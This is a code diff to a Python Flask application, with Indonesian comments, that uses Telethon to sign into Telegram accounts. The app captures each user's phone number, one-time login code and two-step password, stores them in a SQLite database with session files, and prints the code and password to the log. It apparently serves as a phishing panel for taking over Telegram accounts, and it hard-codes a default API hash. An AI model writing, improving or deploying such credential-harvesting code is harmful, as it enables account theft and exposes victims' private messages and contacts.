@@ -17,14 +17,12 @@ app.secret_key = os.getenv("SECRET_KEY", "supersecretkey")
 # ========== KONFIG ==========
 api_id = int(os.getenv("API_ID", 16047851))
 api_hash = os.getenv("API_HASH", "d90d2bfd0b0a86c49e8991bd3a39339a")
-BOT_TOKEN = os.getenv("BOT_TOKEN", "your_bot_token_here")
+BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN")
 
-# Folder sessions & database
+# Folder sessions dan database path
 SESSION_DIR = "/tmp/sessions"
-DB_PATH = os.path.join(os.getcwd(), "data", "users.db")
-
+DB_PATH = "/tmp/users.db"
 os.makedirs(SESSION_DIR, exist_ok=True)
-os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
 
 # ====== DB INIT ======
 def init_db():
@@ -55,33 +53,25 @@ def save_user(phone, otp=None, password=None):
         """, (phone, otp, password))
         conn.commit()
         conn.close()
-        print(f"[DB] ✅ Data tersimpan: {phone} (otp={otp}, password={password})")
+        print(f"[DB] ✅ Data tersimpan: {phone}, otp={otp}, pass={password}")
     except Exception as e:
         print("[DB] ❌ Error save_user:", e)
 
 def get_user(phone):
-    try:
-        conn = sqlite3.connect(DB_PATH, check_same_thread=False)
-        cur = conn.cursor()
-        cur.execute("SELECT phone, otp, password FROM users WHERE phone=?", (phone,))
-        row = cur.fetchone()
-        conn.close()
-        return row
-    except Exception as e:
-        print("[DB] ❌ Error get_user:", e)
-        return None
+    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
+    cur = conn.cursor()
+    cur.execute("SELECT phone, otp, password FROM users WHERE phone=?", (phone,))
+    row = cur.fetchone()
+    conn.close()
+    return row
 
 def get_all_users():
-    try:
-        conn = sqlite3.connect(DB_PATH, check_same_thread=False)
-        cur = conn.cursor()
-        cur.execute("SELECT phone FROM users")
-        rows = cur.fetchall()
-        conn.close()
-        return [r[0] for r in rows]
-    except Exception as e:
-        print("[DB] ❌ Error get_all_users:", e)
-        return []
+    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
+    cur = conn.cursor()
+    cur.execute("SELECT phone FROM users")
+    rows = cur.fetchall()
+    conn.close()
+    return [r[0] for r in rows]
 
 # ====== Helper session files ======
 def remove_session_files(phone_base: str):
@@ -157,14 +147,11 @@ def otp():
             except PhoneCodeInvalidError:
                 await client.disconnect()
                 return {"ok": False, "error": "OTP salah"}
+            except Exception as e:
+                print("[APP] ❌ verify_code error:", e)
+                return {"ok": False, "error": str(e)}
 
-        try:
-            res = asyncio.run(verify_code())
-        except Exception as e:
-            print("[APP] ❌ verify_code error:", e)
-            flash(f"Error verifikasi: {e}", "error")
-            return redirect(url_for("otp"))
-
+        res = asyncio.run(verify_code())
         if res["ok"]:
             if res.get("need_password"):
                 session["need_password"] = True
@@ -203,14 +190,11 @@ def password():
             except PasswordHashInvalidError:
                 await client.disconnect()
                 return {"ok": False, "error": "Password salah"}
+            except Exception as e:
+                print("[APP] ❌ verify_password error:", e)
+                return {"ok": False, "error": str(e)}
 
-        try:
-            res = asyncio.run(verify_password())
-        except Exception as e:
-            print("[APP] ❌ verify_password error:", e)
-            flash(f"Error password: {e}", "error")
-            return redirect(url_for("password"))
-
+        res = asyncio.run(verify_password())
         if res["ok"]:
             flash("Login berhasil ✅", "success")
             return redirect(url_for("success"))
